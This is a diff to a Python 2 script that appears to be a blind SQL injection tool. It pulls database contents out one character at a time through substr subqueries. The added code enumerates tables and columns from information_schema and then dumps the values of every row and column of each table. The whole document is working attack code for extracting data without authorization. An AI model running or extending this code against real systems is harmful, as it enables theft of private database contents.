@@ -65,6 +65,7 @@ def getLength(character):
 def getString(string):
 	length = getLength(string)
 	result = ""
+
 	for i in range(1, length+1):
 		result += getCharacter("(select substr({0},{1},1))".format(string, i))
 
@@ -76,11 +77,12 @@ def getRowNum(table, condition="1"):
 	count = "(select count(*) from {0} where {1})".format(table, condition)
 
 	length = int(getString(count))
+	print "[!] '{0}' columns rows : {1}".format(table, length)
 	return length
 
 # get columns
 def getColumns(column, table, condition="1"):
-	rowNum = getRowNum(table)
+	rowNum = getRowNum(table, condition)
 
 	columns = [ ]
 	for i in range(0, rowNum):
@@ -91,6 +93,17 @@ def getColumns(column, table, condition="1"):
 		columns.append(columnName)
 
 	return columns
+
+
+def getStringFromColumn(column, table, condition="1", limit="1"):
+
+	query = "(select {0} from {1} where {2} limit {3},1)".format(column, table, condition, limit)
+	print query
+	string = getString(query)
+
+	return string
+
+
 
 
 
@@ -109,8 +122,15 @@ if __name__ == "__main__":
 
 
 	tables = getColumns('table_name', 'information_schema.tables', "table_schema='{0}'".format(database))
-	print "[*] Tables : ", tables
+	print "[*] Tables : ", tables, "\n"
 
-	print "[*] Columns : "
-	columns = getColumns('column_name', 'information_schema.columns')
+	for table in tables:
+		print "[*] Columns of table ('{0}'): ".format(table)
+		columns = getColumns('column_name', 'information_schema.columns', "table_name='{0}'".format(table))
 
+		for i in range(0, getRowNum(table)):
+			for column in columns:
+				print "\n\n[*] The values in column ('{0}') : ".format(column)
+				string = getStringFromColumn(column, table, limit=str(i))
+
+				print string
